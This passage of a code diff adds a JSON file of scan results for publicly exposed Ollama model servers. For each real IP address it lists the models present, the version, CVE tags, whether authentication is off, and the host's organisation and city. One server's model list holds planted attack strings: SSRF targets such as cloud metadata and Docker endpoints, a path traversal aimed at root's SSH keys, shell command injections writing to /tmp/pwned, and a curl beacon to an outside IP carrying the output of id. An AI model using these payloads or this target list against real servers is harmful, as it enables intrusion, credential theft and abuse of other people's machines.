+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leak_test_440",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leak_test_5648",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leak_test_1592",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leak_test_4672",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leak_test_989",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leak_test_3940",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "from_test_440",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "from_test_1592",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "from_test_4672",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://metadata.google.internal/computemetadata/v1/instance/service-accounts/default/token",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "test_fileread",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "test_env",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "test_ssh",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "test_aws",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://169.254.169.254/latest/user-data",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://host.docker.internal:2375/info",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://localhost:8888/api/status",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://localhost:6379/info",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://localhost:5432/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "https://kubernetes.default.svc/api/v1/namespaces",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://localhost:2379/v2/keys/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "adapter_test_13296",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "adapter_test_3225",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "adapter_test_15306",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "adapter_test_28845",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "adapter_test_95954",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "adapter_test_88678",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "adapter_test_98741",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "adapter_test_42198",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "adapter_test_49675",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "adapter_test_34410",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "adapter_test_68776",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "adapter_test_61961",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "adapter_test_54279",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "adapter_test_86557",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "adapter_test_41942",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "adapter_test_67427",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "tpl_dump_all_context",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "adapter_test_86323",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "tpl_dump_env",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "tpl_standard_fields",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "tpl_call_tools",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "tpl_type_inspection",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "blob_test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "gpu_worker",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "botnet_node",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "tinyllama:1b",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "eni-test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "eni-lfi",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../../../../../root/.ssh/authorized_keys",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "exfil_9231fb35",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "exfil_15b9d616",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://localhost:22/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://localhost:80/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://localhost:443/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://localhost:3000/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://localhost:8080/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://1.1.1.1/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "ssti_a2f25e",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "ssti_e56324",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "probe_f70f09",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "probe_9270f0",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "probe_501836",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "probe_097306",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "p_dea334",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "p_e53551",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "p_aa633f",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "p_396cbb",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "p_6230af",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://localhost:2375/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://localhost:2376/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://localhost:8000/",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "dkr_0ad9",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "dkr_57af",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "dkr_efd7",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "dkr_6e6c",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "test;id>/tmp/pwned",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "test;curl http://114.10.39.70:11443/beacon?cmd=$(id)",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "readpasswd",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "readetc",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "readfile",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "`id > /tmp/pwned_backtick`",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "$(id > /tmp/pwned_dollar)",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "test;id>/tmp/pwned_semi",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "test|id>/tmp/pwned_pipe",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leak__root_.ssh_id_ed25519",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      }
+    ],
+    "version": "0.1.45",
+    "cves": [
+      "CVE-2024-39722",
+      "CVE-2024-39721",
+      "CVE-2025"
+    ],
+    "generation_test": true,
+    "error": null,
+    "org": "Linode",
+    "country": "Netherlands",
+    "city": "Amsterdam",
+    "hostnames": [
+      "172-233-44-98.ip.linodeusercontent.com"
+    ]
+  },
+  {
+    "url": "http://103.112.163.92:11434",
+    "accessible": true,
+    "auth_required": false,
+    "models": [
+      {
+        "name": "llama3.1:latest",
+        "size_bytes": 4661211808,
+        "size_mb": 4445,
+        "params": "8.0B",
+        "quantization": "Q4_0",
+        "family": "llama"
+      },
+      {
+        "name": "mistral:latest",
+        "size_bytes": 4113301824,
+        "size_mb": 3923,
+        "params": "7.2B",
+        "quantization": "Q4_0",
+        "family": "llama"
+      },
+      {
+        "name": "codellama:13b",
+        "size_bytes": 7365960704,
+        "size_mb": 7025,
+        "params": "13B",
+        "quantization": "Q4_0",
+        "family": "llama"
+      },
+      {
+        "name": "phi3:latest",
+        "size_bytes": 2393232672,
+        "size_mb": 2282,
+        "params": "3.8B",
+        "quantization": "Q4_K_M",
+        "family": "phi3"
+      },
+      {
+        "name": "nomic-embed-text:latest",
+        "size_bytes": 274302400,
+        "size_mb": 262,
+        "params": "137M",
+        "quantization": "F16",
+        "family": "nomic-bert"
+      }
+    ],
+    "version": "0.5.7",
+    "cves": [],
+    "generation_test": true,
+    "error": null,
+    "org": "PT Cloud Teknologi Nusantara",
+    "country": "Indonesia",
+    "city": "Jakarta",
+    "hostnames": [
+      "ip-103-112-163-92.cloudteknologinusantara.co.id"
+    ]
+  },
+  {
+    "url": "http://82.64.199.159:11434",
+    "accessible": false,
+    "auth_required": true,
+    "models": [],
+    "version": null,
+    "cves": [],
+    "generation_test": false,
+    "error": "401 Unauthorized",
+    "org": "Free SAS",
+    "country": "France",
+    "city": "Morangis",
+    "hostnames": [
+      "82-64-199-159.subs.proxad.net"
+    ]
+  },
+  {
+    "url": "http://45.150.108.219:11434",
+    "accessible": true,
+    "auth_required": false,
+    "models": [
+      {
+        "name": "deepseek-r1:14b",
+        "size_bytes": 8904292741,
+        "size_mb": 8492,
+        "params": "14B",
+        "quantization": "Q8_0",
+        "family": "deepseek"
+      },
+      {
+        "name": "deepseek-r1:latest",
+        "size_bytes": 18702648175,
+        "size_mb": 17836,
+        "params": "33B",
+        "quantization": "Q5_K_M",
+        "family": "deepseek"
+      },
+      {
+        "name": "qwen2.5:72b",
+        "size_bytes": 38004422750,
+        "size_mb": 36244,
+        "params": "72B",
+        "quantization": "Q5_K_M",
+        "family": "qwen"
+      },
+      {
+        "name": "gemma3:8.2b",
+        "size_bytes": 5100142883,
+        "size_mb": 4864,
+        "params": "8.2B",
+        "quantization": "F16",
+        "family": "gemma"
+      }
+    ],
+    "version": "0.1.46",
+    "cves": [
+      "CVE-2024-39722",
+      "CVE-2024-39721",
+      "CVE-2025"
+    ],
+    "generation_test": true,
+    "error": null,
+    "org": "BlueVPS OU",
+    "country": "Israel",
+    "city": "Tel Aviv",
+    "hostnames": [
+      "mta0.deltadentalcs.cf"
+    ]
+  },
+  {
+    "url": "http://130.61.196.102:11434",
+    "accessible": false,
+    "auth_required": true,
+    "models": [],
+    "version": null,
+    "cves": [],
+    "generation_test": false,
+    "error": "401 Unauthorized",
+    "org": "Oracle Public Cloud",
+    "country": "Germany",
+    "city": "Frankfurt am Main",
+    "hostnames": []
+  },
+  {
+    "url": "http://38.180.16.112:11434",
+    "accessible": true,
+    "auth_required": false,
+    "models": [
+      {
+        "name": "deepseek-r1:14b",
+        "size_bytes": 8903576114,
+        "size_mb": 8491,
+        "params": "14B",
+        "quantization": "F16",
+        "family": "deepseek"
+      },
+      {
+        "name": "qwen2.5:72b",
+        "size_bytes": 38002516239,
+        "size_mb": 36242,
+        "params": "72B",
+        "quantization": "Q5_K_M",
+        "family": "qwen"
+      },
+      {
+        "name": "gemma3:8.2b",
+        "size_bytes": 5103538571,
+        "size_mb": 4867,
+        "params": "8.2B",
+        "quantization": "Q8_0",
+        "family": "gemma"
+      },
+      {
+        "name": "deepseek-r1:latest",
+        "size_bytes": 18701417143,
+        "size_mb": 17835,
+        "params": "33B",
+        "quantization": "Q8_0",
+        "family": "deepseek"
+      }
+    ],
+    "version": "0.1.46",
+    "cves": [
+      "CVE-2024-39722",
+      "CVE-2024-39721",
+      "CVE-2025"
+    ],
+    "generation_test": true,
+    "error": null,
+    "org": "3NT SOLUTIONS LLP",
+    "country": "Brazil",
+    "city": "S\u00e3o Paulo",
+    "hostnames": []
+  },
+  {
+    "url": "http://51.161.131.235:11434",
+    "accessible": true,
+    "auth_required": false,
+    "models": [
+      {
+        "name": "deepseek-r1:latest",
+        "size_bytes": 18701559444,
+        "size_mb": 17835,
+        "params": "33B",
+        "quantization": "Q4_K_M",
+        "family": "deepseek"
+      },
+      {
+        "name": "qwen2.5:72b",
+        "size_bytes": 38000729834,
+        "size_mb": 36240,
+        "params": "72B",
+        "quantization": "F16",
+        "family": "qwen"
+      },
+      {
+        "name": "gemma3:8.2b",
+        "size_bytes": 5100349025,
+        "size_mb": 4864,
+        "params": "8.2B",
+        "quantization": "Q5_K_M",
+        "family": "gemma"
+      },
+      {
+        "name": "deepseek-r1:14b",
+        "size_bytes": 8900943838,
+        "size_mb": 8489,
+        "params": "14B",
+        "quantization": "Q4_K_M",
+        "family": "deepseek"
+      }
+    ],
+    "version": "0.1.46",
+    "cves": [
+      "CVE-2024-39722",
+      "CVE-2024-39721",
+      "CVE-2025"
+    ],
+    "generation_test": true,
+    "error": null,
+    "org": "OVH Australia PTY LTD",
+    "country": "Australia",
+    "city": "Sydney",
+    "hostnames": [
+      "vps-bc97317a.vps.ovh.ca"
+    ]
+  },
+  {
+    "url": "http://168.235.74.31:11434",
+    "accessible": true,
+    "auth_required": false,
+    "models": [
+      {
+        "name": "qwen2.5:72b",
+        "size_bytes": 38002303923,
+        "size_mb": 36242,
+        "params": "72B",
+        "quantization": "Q8_0",
+        "family": "qwen"
+      },
+      {
+        "name": "deepseek-r1:latest",
+        "size_bytes": 18703395282,
+        "size_mb": 17837,
+        "params": "33B",
+        "quantization": "Q8_0",
+        "family": "deepseek"
+      },
+      {
+        "name": "deepseek-r1:14b",
+        "size_bytes": 8904866289,
+        "size_mb": 8492,
+        "params": "14B",
+        "quantization": "F16",
+        "family": "deepseek"
+      },
+      {
+        "name": "gemma3:8.2b",
+        "size_bytes": 5104024551,
+        "size_mb": 4868,
+        "params": "8.2B",
+        "quantization": "F16",
+        "family": "gemma"
+      }
+    ],
+    "version": "0.1.46",
+    "cves": [
+      "CVE-2024-39722",
+      "CVE-2024-39721",
+      "CVE-2025"
+    ],
+    "generation_test": true,
+    "error": null,
+    "org": "RAMNODE",
+    "country": "United States",
+    "city": "Los Angeles",
+    "hostnames": [
+      "168-235-74-31.cloud.ramnode.com"
+    ]
+  },
+  {
+    "url": "http://107.161.25.224:11434",
+    "accessible": true,
+    "auth_required": false,
+    "models": [
+      {
+        "name": "qwen2.5:72b",
+        "size_bytes": 38001262253,
+        "size_mb": 36241,
+        "params": "72B",
+        "quantization": "Q4_K_M",
+        "family": "qwen"
+      },
+      {
+        "name": "deepseek-r1:latest",
+        "size_bytes": 18703281232,
+        "size_mb": 17837,
+        "params": "33B",
+        "quantization": "Q4_K_M",
+        "family": "deepseek"
+      },
+      {
+        "name": "gemma3:8.2b",
+        "size_bytes": 5101611116,
+        "size_mb": 4865,
+        "params": "8.2B",
+        "quantization": "F16",
+        "family": "gemma"
+      },
+      {
+        "name": "deepseek-r1:14b",
+        "size_bytes": 8902135405,
+        "size_mb": 8490,
+        "params": "14B",
+        "quantization": "F16",
+        "family": "deepseek"
+      }
+    ],
+    "version": "0.1.46",
+    "cves": [
+      "CVE-2024-39722",
+      "CVE-2024-39721",
+      "CVE-2025"
+    ],
+    "generation_test": true,
+    "error": null,
+    "org": "RAMNODE",
+    "country": "United States",
+    "city": "Seattle",
+    "hostnames": [
+      "107-161-25-224.cloud.ramnode.com"
+    ]
+  },
+  {
+    "url": "http://84.247.131.184:11434",
+    "accessible": true,
+    "auth_required": false,
+    "models": [
+      {
+        "name": "llama3.1:8b",
+        "size_bytes": 4661224676,
+        "size_mb": 4445,
+        "params": "8B",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "llama3.2:3b",
+        "size_bytes": 2019393189,
+        "size_mb": 1926,
+        "params": "3B",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "qwen2.5:7b",
+        "size_bytes": 4113301824,
+        "size_mb": 3923,
+        "params": "7B",
+        "quantization": "Q4_K_M",
+        "family": "qwen"
+      },
+      {
+        "name": "mistral:7b",
+        "size_bytes": 4113301824,
+        "size_mb": 3923,
+        "params": "7B",
+        "quantization": "Q4_K_M",
+        "family": "mistral"
+      },
+      {
+        "name": "deepseek-r1:8b",
+        "size_bytes": 4661224676,
+        "size_mb": 4445,
+        "params": "8B",
+        "quantization": "Q4_K_M",
+        "family": "deepseek"
+      },
+      {
+        "name": "nomic-embed-text:latest",
+        "size_bytes": 274302450,
+        "size_mb": 262,
+        "params": "137M",
+        "quantization": "Q4_K_M",
+        "family": "nomic-bert"
+      }
+    ],
+    "version": "0.5.7",
+    "cves": [],
+    "generation_test": true,
+    "error": null,
+    "org": "Contabo GmbH",
+    "country": "Germany",
+    "city": "D\u00fcsseldorf",
+    "hostnames": [
+      "vmi3404984.contaboserver.net"
+    ]
+  },
+  {
+    "url": "http://173.255.226.61:11434",
+    "accessible": true,
+    "auth_required": false,
+    "models": [
+      {
+        "name": "deepseek-r1:70b",
+        "size_bytes": 42182029312,
+        "size_mb": 40228,
+        "params": "70.6B",
+        "quantization": "Q4_K_M",
+        "family": "deepseek"
+      },
+      {
+        "name": "llama3.1:8b-instruct-q8_0",
+        "size_bytes": 4700000000,
+        "size_mb": 4482,
+        "params": "8.0B",
+        "quantization": "Q8_0",
+        "family": "llama"
+      },
+      {
+        "name": "nomic-embed-text",
+        "size_bytes": 274000000,
+        "size_mb": 261,
+        "params": "137M",
+        "quantization": "F16",
+        "family": "nomic-bert"
+      }
+    ],
+    "version": "0.24.0",
+    "cves": [],
+    "generation_test": true,
+    "error": null,
+    "org": "Linode",
+    "country": "United States",
+    "city": "Cedar Knolls",
+    "hostnames": [
+      "173-255-226-61.ip.linodeusercontent.com"
+    ]
+  },
+  {
+    "url": "http://133.4.188.41:11434",
+    "accessible": true,
+    "auth_required": false,
+    "models": [
+      {
+        "name": "llama3.1:8b",
+        "size_bytes": 4920753328,
+        "size_mb": 4693,
+        "params": "8.0B",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "nomic-embed-text:latest",
+        "size_bytes": 274302144,
+        "size_mb": 262,
+        "params": "137M",
+        "quantization": "F16",
+        "family": "bert"
+      }
+    ],
+    "version": "0.3.12",
+    "cves": [
+      "CVE-2024-39722",
+      "CVE-2024-39721",
+      "CVE-2025"
+    ],
+    "generation_test": true,
+    "error": null,
+    "org": "Japan Network Information Center",
+    "country": "Japan",
+    "city": "Tokyo",
+    "hostnames": []
+  },
+  {
+    "url": "http://209.15.123.75:11434",
+    "accessible": false,
+    "auth_required": false,
+    "models": [],
+    "version": null,
+    "cves": [],
+    "generation_test": false,
+    "error": "timed out",
+    "org": "CAT TELECOM, CAT Cloud Dept, 99 Chaengwatthana Rd. Lak Si, Bangkok 10210",
+    "country": "Thailand",
+    "city": "Bangkok",
+    "hostnames": [
+      "ntplc.co.th"
+    ]
+  },
+  {
+    "url": "http://38.180.44.128:11434",
+    "accessible": true,
+    "auth_required": false,
+    "models": [
+      {
+        "name": "deepseek-r1:14b",
+        "size_bytes": 8901340929,
+        "size_mb": 8489,
+        "params": "14B",
+        "quantization": "F16",
+        "family": "deepseek"
+      },
+      {
+        "name": "qwen2.5:72b",
+        "size_bytes": 38002504645,
+        "size_mb": 36242,
+        "params": "72B",
+        "quantization": "Q4_K_M",
+        "family": "qwen"
+      },
+      {
+        "name": "deepseek-r1:latest",
+        "size_bytes": 18703801184,
+        "size_mb": 17837,
+        "params": "33B",
+        "quantization": "F16",
+        "family": "deepseek"
+      },
+      {
+        "name": "gemma3:8.2b",
+        "size_bytes": 5102230218,
+        "size_mb": 4866,
+        "params": "8.2B",
+        "quantization": "Q8_0",
+        "family": "gemma"
+      }
+    ],
+    "version": "0.1.46",
+    "cves": [
+      "CVE-2024-39722",
+      "CVE-2024-39721",
+      "CVE-2025"
+    ],
+    "generation_test": true,
+    "error": null,
+    "org": "3NT SOLUTIONS LLP",
+    "country": "Estonia",
+    "city": "Tallinn",
+    "hostnames": []
+  },
+  {
+    "url": "http://104.238.151.233:11434",
+    "accessible": false,
+    "auth_required": false,
+    "models": [],
+    "version": null,
+    "cves": [],
+    "generation_test": false,
+    "error": "timed out",
+    "org": "Vultr Holdings, LLC",
+    "country": "Japan",
+    "city": "\u014ci",
+    "hostnames": [
+      "infoapi.net"
+    ]
+  },
+  {
+    "url": "http://188.103.72.213:11434",
+    "accessible": false,
+    "auth_required": true,
+    "models": [],
+    "version": null,
+    "cves": [],
+    "generation_test": false,
+    "error": "401 Unauthorized",
+    "org": "ARCOR AG",
+    "country": "Germany",
+    "city": "Berlin",
+    "hostnames": [
+      "dslb-188-103-072-213.188.103.pools.vodafone-ip.de"
+    ]
+  },
+  {
+    "url": "http://45.76.146.25:11434",
+    "accessible": false,
+    "auth_required": false,
+    "models": [],
+    "version": null,
+    "cves": [],
+    "generation_test": false,
+    "error": "timed out",
+    "org": "Vultr Holdings, LLC",
+    "country": "Singapore",
+    "city": "Singapore",
+    "hostnames": [
+      "cloudstatapp.com"
+    ]
+  },
+  {
+    "url": "http://38.91.104.106:11434",
+    "accessible": true,
